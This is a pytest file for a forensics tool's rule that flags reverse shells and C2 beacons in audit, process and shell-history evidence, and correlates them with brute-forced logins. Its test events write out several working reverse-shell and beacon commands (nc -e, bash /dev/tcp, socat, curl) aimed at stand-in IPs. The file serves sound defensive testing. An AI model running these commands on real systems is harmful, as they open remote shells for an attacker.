"""suspicious_process correlation rule (scenario #6).

Turns the execution EVIDENCE produced by auditd_parser / ps_parser /
shellhist_parser into scored FINDINGS: a command whose shape is a reverse
shell, C2 beacon or encoded payload is flagged, and when it follows a
brute-forced login within the window the finding is raised to high confidence
(post-compromise execution).

Shell history is the path that carries scenario #6 on a host with no auditd,
so it is covered here in both its subcategories ('shell_command' and the
already-graded 'suspicious_command'), including the caveat a history-only
finding must state - history is what was typed, not what ran, and the account
owner can edit it. The same command recorded by two parsers is one finding.
"""
import pytest

from lfa import db
from lfa.rules.execution import SuspiciousProcessRule


def run_rule(conn, rule, ctx=None):
    return list(rule.run(conn, ctx or {}))


def _exec_event(event_factory, cmd, **over):
    kw = dict(
        category="user_activity",
        subcategory="process_execution",
        description=f"Process executed: {cmd}",
        raw_line=cmd,
        actor_process=cmd.split()[0],
        severity="info",
    )
    kw.update(over)
    return event_factory(**kw)


def test_reverse_shell_execve_is_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "nc -e /bin/sh 10.0.0.1 4444"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    f = hits[0]
    assert f.rule_name == "suspicious_process"
    assert f.severity == "high"
    assert "nc -e /bin/sh" in f.plain.what_happened
    assert len(f.event_ids) >= 1
    conn.close()


def test_benign_execution_not_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "/usr/bin/ls -la /home"),
        _exec_event(event_factory, "/sbin/init"),
    ])
    assert run_rule(conn, SuspiciousProcessRule()) == []
    conn.close()


def test_c2_beacon_curl_to_ip_is_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "curl -s http://203.0.113.9/beacon"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    assert hits[0].severity == "high"
    conn.close()


def test_running_process_snapshot_flagged_without_timestamp(tmp_path, event_factory):
    # ps snapshot: state_finding, no timestamp. Must flag, must not crash.
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _exec_event(event_factory, "nc -e /bin/sh 10.0.0.1 4444",
                    subcategory="running_process", event_kind="state_finding",
                    timestamp_utc=None, timestamp_local=None,
                    timestamp_confidence="unknown", severity="medium"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    assert hits[0].plain.confidence == "Medium"  # no timeline to correlate
    conn.close()


def test_execution_after_bruteforce_login_is_high_confidence(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    events = []
    # a brute-force burst from one IP (distinct raw lines / offsets so the
    # event_hash dedupe keeps them as six separate events, like real logs)
    for i in range(6):
        events.append(event_factory(
            subcategory="failed_login", severity="low",
            timestamp_utc=f"2024-03-14T02:0{i}:00+00:00",
            source_ip="203.0.113.9",
            raw_line=f"Mar 14 02:0{i}:00 web1 sshd[1{i}]: Failed password",
            raw_line_offset=100 * i,
            description=f"Failed password attempt {i}"))
    # a successful login from that same IP
    events.append(event_factory(
        subcategory="successful_login", severity="medium",
        timestamp_utc="2024-03-14T02:10:00+00:00", source_ip="203.0.113.9",
        raw_line="Mar 14 02:10:00 web1 sshd[999]: Accepted password",
        raw_line_offset=9000,
        description="Accepted password from 203.0.113.9"))
    # a reverse shell executed 5 minutes later
    events.append(_exec_event(event_factory, "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1",
                              timestamp_utc="2024-03-14T02:15:00+00:00",
                              source_ip=None))
    db.insert_events(conn, events)

    hits = run_rule(conn, SuspiciousProcessRule())
    exec_hits = [h for h in hits if "/dev/tcp" in h.plain.what_happened]
    assert exec_hits, "reverse shell not flagged"
    f = exec_hits[0]
    assert f.plain.confidence == "High"          # correlated with the login
    assert "203.0.113.9" in f.technical_detail    # references the correlated login
    conn.close()


def _hist_event(event_factory, cmd, user="root", **over):
    """What shellhist_parser writes for one history line."""
    kw = dict(
        category="user_activity",
        subcategory="shell_command",
        description=f"User {user} executed: {cmd}",
        raw_line=cmd,
        actor_user=user,
        actor_process=None,
        source_artifact_path=f"home/{user}/.bash_history",
        parser_name="shellhist_parser",
        severity="info",
        timestamp_utc=None,
        timestamp_local=None,
        timestamp_confidence="unknown",
    )
    kw.update(over)
    return event_factory(**kw)


def test_history_only_reverse_shell_is_flagged(tmp_path, event_factory):
    # The Metasploitable case: no auditd, process long gone, history is the
    # only record left. It must still score.
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _hist_event(event_factory, "socat TCP:203.0.113.9:4444 EXEC:/bin/sh"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    f = hits[0]
    assert f.severity == "high"
    assert f.plain.confidence == "Medium"
    assert "socat" in f.plain.what_happened
    assert "shell history" in f.technical_detail
    # history is attacker-editable: the finding must say so and say what to do
    assert "wipe" in f.plain.why_it_matters
    assert "Corroborate" in f.plain.check_next
    conn.close()


def test_history_suspicious_command_subcategory_is_flagged(tmp_path, event_factory):
    # shellhist_parser grades 'nc -e' as suspicious_command, not shell_command.
    # The rule must consume both or the classic payloads are missed.
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _hist_event(event_factory, "nc -e /bin/sh 203.0.113.9 4444",
                    subcategory="suspicious_command", severity="high"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    assert "nc -e /bin/sh" in hits[0].plain.what_happened
    conn.close()


def test_benign_history_command_not_flagged(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    db.insert_events(conn, [
        _hist_event(event_factory, "ls -la /var/www"),
        _hist_event(event_factory, "sudo apt-get update"),
    ])
    assert run_rule(conn, SuspiciousProcessRule()) == []
    conn.close()


def test_timestamped_history_after_bruteforce_is_high_confidence(tmp_path, event_factory):
    # HISTTIMEFORMAT was set, so the history line carries a real timestamp and
    # correlates with the brute-forced login exactly like an execve would.
    conn = db.open_case(tmp_path / "c.db")
    events = []
    for i in range(6):
        events.append(event_factory(
            subcategory="failed_login", severity="low",
            timestamp_utc=f"2024-03-14T02:0{i}:00+00:00",
            source_ip="203.0.113.9",
            raw_line=f"Mar 14 02:0{i}:00 web1 sshd[1{i}]: Failed password",
            raw_line_offset=100 * i,
            description=f"Failed password attempt {i}"))
    events.append(event_factory(
        subcategory="successful_login", severity="medium",
        timestamp_utc="2024-03-14T02:10:00+00:00", source_ip="203.0.113.9",
        raw_line="Mar 14 02:10:00 web1 sshd[999]: Accepted password",
        raw_line_offset=9000,
        description="Accepted password from 203.0.113.9"))
    events.append(_hist_event(event_factory, "perl -e 'use Socket;...'",
                              timestamp_utc="2024-03-14T02:20:00+00:00",
                              timestamp_local="2024-03-14T07:20:00+05:00",
                              timestamp_confidence="exact",
                              source_ip=None))
    db.insert_events(conn, events)

    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    f = hits[0]
    assert f.plain.confidence == "High"
    assert "203.0.113.9" in f.technical_detail
    # the login event is carried alongside the history event
    assert len(f.event_ids) == 2
    conn.close()


def test_same_command_in_audit_and_history_is_one_finding(tmp_path, event_factory):
    # auditd and the history file both recorded the same reverse shell. One
    # command, one finding, both events attached and both sources named.
    conn = db.open_case(tmp_path / "c.db")
    cmd = "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1"
    db.insert_events(conn, [
        _exec_event(event_factory, cmd,
                    timestamp_utc="2024-03-14T02:20:00+00:00"),
        _hist_event(event_factory, cmd,
                    timestamp_utc="2024-03-14T02:20:00+00:00",
                    timestamp_local="2024-03-14T07:20:00+05:00",
                    timestamp_confidence="exact"),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1, [h.title for h in hits]
    f = hits[0]
    assert len(f.event_ids) == 2
    assert "kernel audit trail" in f.technical_detail
    assert "shell history" in f.technical_detail
    # corroborated by auditd, so it is not downgraded to a history-only lead
    assert "wipe" not in f.plain.why_it_matters
    conn.close()


def test_repeated_command_spans_first_and_last_timestamp(tmp_path, event_factory):
    conn = db.open_case(tmp_path / "c.db")
    cmd = "curl -s http://203.0.113.9/beacon"
    db.insert_events(conn, [
        _exec_event(event_factory, cmd, timestamp_utc="2024-03-14T02:20:00+00:00",
                    raw_line_offset=10),
        _exec_event(event_factory, cmd, timestamp_utc="2024-03-14T09:45:00+00:00",
                    raw_line_offset=20),
    ])
    hits = run_rule(conn, SuspiciousProcessRule())
    assert len(hits) == 1
    f = hits[0]
    assert f.first_ts_utc == "2024-03-14T02:20:00+00:00"
    assert f.last_ts_utc == "2024-03-14T09:45:00+00:00"
    conn.close()
